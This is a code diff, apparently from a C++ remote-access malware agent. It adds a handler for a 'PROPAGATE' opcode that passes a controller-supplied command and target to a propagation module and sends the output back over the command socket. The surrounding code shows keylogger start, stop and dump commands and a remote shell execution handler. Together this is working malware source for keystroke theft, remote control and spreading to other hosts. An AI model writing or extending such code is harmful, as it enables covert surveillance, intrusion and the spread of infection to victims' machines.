@@ -185,6 +185,8 @@ void Agent::handleDispatching(Packet&& packet) {
         handleKeylogStop();
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DUMP)) {
         handleKeylogDump();
+    } else if (opcode == static_cast<uint16_t>(Opcode::PROPAGATE)) {
+        handlePropagation(std::move(packet));
     }
 }
 
@@ -245,6 +247,29 @@ void Agent::handleKeylogDump() {
     std::cout << "[Agent] Keylogger dump requested (jitter scheduled)...\n";
     m_keylog_dump_requested = true;
     m_keylog_jitter_cv.notify_one();
+}
+
+void Agent::handlePropagation(Packet&& packet) {
+    const auto& raw = packet.getPayload();
+    if (raw.empty()) return;
+
+    uint8_t cmd_byte = raw[0];
+    std::string target(raw.begin() + 1, raw.end());
+
+    Propagator::Command cmd = static_cast<Propagator::Command>(cmd_byte);
+    Propagator::Result result = m_propagator.execute(cmd, target);
+
+    // Build result payload: 1 byte success + output string
+    std::vector<uint8_t> payload;
+    payload.push_back(result.success ? 1 : 0);
+    uint16_t out_len = static_cast<uint16_t>(result.output.size());
+    payload.push_back(static_cast<uint8_t>((out_len >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(out_len & 0xFF));
+    payload.insert(payload.end(), result.output.begin(), result.output.end());
+
+    Packet res(static_cast<uint16_t>(Opcode::PROPAGATE_RES),
+               std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
 }
 
 void Agent::handleShellExecution(Packet&& packet) {
